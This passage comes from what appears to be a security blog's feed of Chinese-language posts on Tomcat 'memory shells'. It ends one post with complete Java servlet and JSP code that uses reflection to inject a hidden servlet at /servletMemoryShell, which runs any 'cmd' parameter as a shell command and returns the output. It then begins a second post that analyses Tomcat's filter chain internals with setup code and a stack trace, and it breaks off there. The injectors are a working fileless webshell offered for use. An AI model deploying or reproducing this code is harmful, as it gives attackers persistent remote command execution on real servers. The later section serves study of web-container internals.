class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletMapping</span> <span class="operator">=</span> standardContext.findServletMapping(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (servletMapping != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            wrapper.setName(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">servletMemoryShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                    <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                    <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        httpServletResponse.getWriter().write(output);</span><br><span class="line">                        httpServletResponse.getWriter().flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">            wrapper.setServlet(servletMemoryShell);</span><br><span class="line">            wrapper.setServletClass(servletMemoryShell.getClass().getName());</span><br><span class="line"></span><br><span class="line">            standardContext.addChild(wrapper);</span><br><span class="line">            standardContext.addServletMapping(<span class="string">&quot;/servletMemoryShell&quot;</span>, <span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Servlet Inject Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Servlet/6.png"></p><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">servletMapping</span> <span class="operator">=</span> standardContext.findServletMapping(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (servletMapping != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">servletMemoryShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                httpServletResponse.getWriter().write(output);</span><br><span class="line">                httpServletResponse.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setServlet(servletMemoryShell);</span><br><span class="line">    wrapper.setServletClass(servletMemoryShell.getClass().getName());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMapping(<span class="string">&quot;/servletMemoryShell&quot;</span>, <span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Servlet Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Servlet/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Filter</title>
      <link href="/2024/05/18/Tomcat-Filter/"/>
      <url>/2024/05/18/Tomcat-Filter/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了的一个ServletContext接口，其提供了Web应用所有Servlet的视图，通过它可以对某个Web应用的各种资源和功能进行访问。Web容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext，它代表当前Web应用，并且它被所有客户端共享。</p><p><img src="/2024/05/18/Tomcat-Filter/1.png"></p><p>动态注册filter时需要添加filter相关的函数，而ServletContext恰好可以满足这个条件。javax.servlet.servletContext中存在addFilter、addServlet和addListener方法，即对应实现添加Filter、Servlet和Listener。</p><p>获取ServletContext的方法有：</p><ul><li><p>this.getServletContext()</p></li><li><p>this.getimg&#x2F;ServletConfig().getServletContext();</p></li></ul><p><img src="/2024/05/18/Tomcat-Filter/2.png"></p><p>可以看到，获取到的实际上是一个ApplicationContextFacade对象，且该对象是对ApplicationContext实例的封装。</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>对应Tomcat容器，为了满足Servlet规范，必须包含一个ServletContext接口的实现。Tomcat的Context容器中都会包含一个ApplicationContext。</p><p>在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取上下文StandardContext。</p><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext<a href="https://www.cnblogs.com/nice0e3/p/14622879.html#standardcontext"></a></h3><p>Catalina主要包括Connector和Container，StandardContext就是一个Container，它主要负责对进入的用户请求进行处理。实际上，并不是由StandardContext来进行处理，而是交给内部的valve进行处理。</p><p>一个Context表示了一个外部应用，它包含多个Wrapper，每个Wrapper表示一个Servlet定义。（Tomcat默认的Service服务是Catalina）</p><h3 id="Filter-Related-Variables"><a href="#Filter-Related-Variables" class="headerlink" title="Filter Related Variables"></a>Filter Related Variables</h3><table><thead><tr><th align="center">名称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">filterMaps 变量</td><td align="center">存放FilterMap的数组，在FilterMap中主要存放了FilterName和对应的URLPattern</td></tr><tr><td align="center">filterDefs 变量</td><td align="center">存放FilterDef的数组，FilterDef中存储着我们过滤器名，过滤器实例等基本信息</td></tr><tr><td align="center">filterConfigs 变量</td><td align="center">存放filterConfig的数组，在FilterConfig中主要存放FilterDef和Filter对象等信息</td></tr><tr><td align="center">FilterChain 变量</td><td align="center">过滤器链，该对象上的doFilter方法能依次调用链上的Filter</td></tr><tr><td align="center">ApplicationFilterChain</td><td align="center">调用过滤器链</td></tr><tr><td align="center">ApplicationFilterConfig</td><td align="center">获取过滤器</td></tr><tr><td align="center">ApplicationFilterFactory</td><td align="center">组装过滤器链</td></tr><tr><td align="center">StandardContext</td><td align="center">Context接口的标准实现类，一个Context代表一个Web应用，其下可以包含多个Wrapper</td></tr><tr><td align="center">StandardWrapperValve</td><td align="center">Wrapper的标准实现类，一个Wrapper代表一个Servlet</td></tr></tbody></table><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><ul><li>环境搭建</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;HelloServlet&quot;, value = &quot;/HelloServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        writer.println(<span class="string">&quot;This is HelloServlet Page.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;HelloFilter&quot;, urlPatterns = &quot;/HelloServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter Destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter Start...&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/3.png"></p><p>在doFilter中下个断点，堆栈信息如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">19</span>, HelloFilter (filter)</span><br><span class="line">internalDoFilter:<span class="number">181</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">156</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">494</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">682</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">617</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">932</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1695</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在堆栈信息中可以看到Container容器中四种子容器的调用，StandardEngineValve-&gt;StandardHostValve-&gt;StandardContextValve-&gt;StandardWrapperValve。往前回溯一下，跟进org.apache.catalina.core.StandardWrapperValve#invoke，可以看到其创建了一个FilterChain，接着调用它的doFilter方法。</p><p><img src="/2024/05/18/Tomcat-Filter/4.png"></p><p>这里跟进一下org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法，看看是如何创建filterChain的。首先对传入的ServletRequest对象进行判断，若为Request实例，则进一步从其中获取filterChain，若filterChain不存在，则创建一个并设置到Request对象内。</p><p>接着从wrapper中获取StandardContext对象，调用org.apache.catalina.core.StandardContext#findFilterMaps方法获取filterMaps。</p><p>当获取到的filterMaps不为空时，对filterMaps进行遍历，调用getFilterName方法来获取filterName，把获取到的filterName传入org.apache.catalina.core.StandardContext#findFilterConfig方法中来获取filterConfig，并将获取到的filterConfig添加进filterChain中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                                       Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If there is no servlet to execute, return null</span></span><br><span class="line">  <span class="keyword">if</span> (servlet == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create and initialize a filter chain object</span></span><br><span class="line">  <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">    <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">      <span class="comment">// Security: Do not recycle</span></span><br><span class="line">      filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">      <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        req.setFilterChain(filterChain);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Request dispatcher in use</span></span><br><span class="line">    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  filterChain.setServlet(servlet);</span><br><span 